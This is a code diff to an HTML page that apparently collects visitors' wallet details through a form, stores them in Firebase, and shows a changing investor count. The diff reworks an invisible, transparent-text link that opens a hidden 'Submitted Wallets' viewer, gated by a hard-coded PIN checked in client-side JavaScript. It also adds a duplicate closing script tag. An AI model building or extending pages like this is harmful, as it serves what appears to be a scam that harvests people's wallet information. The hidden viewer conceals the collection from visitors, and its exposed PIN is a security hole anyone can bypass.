@@ -184,10 +184,17 @@
   </form>
 </section>
 
-<!-- Invisible but clickable secret -->
-<p id="adminSecret" style="font-size: 12px; text-align: center; color: transparent; cursor: pointer;" onclick="enterPin()">Submitted Details</p>
+<!-- Secret unlocker (hidden text) -->
+<p id="unlockPrompt" style="font-size: 10px; text-align: center; color: transparent; cursor: pointer;" onclick="askCode()">Submitted Details</p>
 
-<!-- Viewer for submitted entries -->
+<!-- Hidden area for code entry -->
+<div id="codeEntry" style="display:none; text-align:center;">
+  <input type="password" id="codeInput" placeholder="Enter Admin Code" maxlength="6" />
+  <button onclick="verifyCode()">Unlock</button>
+  <p id="codeError" style="color:red;"></p>
+</div>
+
+<!-- Hidden Submissions viewer -->
 <div id="submissions" style="display:none; padding: 20px; border: 1px solid #ccc;">
   <h3>Submitted Wallets</h3>
   <ul id="submissionList"></ul>
@@ -269,6 +276,7 @@ setInterval(updateInvestors, 10000);
 <script>
   const db = firebase.firestore();
 
+  // Submit form logic
   document.getElementById("walletForm").addEventListener("submit", function(e) {
     e.preventDefault();
     const name = this.name.value;
@@ -289,19 +297,28 @@ setInterval(updateInvestors, 10000);
     });
   });
 
-  function enterPin() {
-    const pin = prompt("Enter PIN to view submitted details:");
-    if (pin === "090599") {
+  // Show code input
+  function askCode() {
+    document.getElementById("codeEntry").style.display = "block";
+  }
+
+  // Unlock submissions
+  function verifyCode() {
+    const code = document.getElementById("codeInput").value;
+    if (code === "090599") {
       showSubmissions();
     } else {
-      alert("Access Denied ❌");
+      document.getElementById("codeError").innerText = "Incorrect code!";
     }
   }
 
+  // View entries
   function showSubmissions() {
-    const viewer = document.getElementById("submissions");
+    document.getElementById("submissions").style.display = "block";
+    document.getElementById("codeEntry").style.display = "none";
+    document.getElementById("codeError").innerText = "";
+
     const list = document.getElementById("submissionList");
-    viewer.style.display = "block";
     list.innerHTML = "";
 
     db.collection("submissions").orderBy("timestamp", "desc").get().then(snapshot => {
@@ -313,6 +330,7 @@ setInterval(updateInvestors, 10000);
       });
     });
   }
+</script>
 
 </script><!-- Tawk.to Chat Script --><script type="text/javascript">
 var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
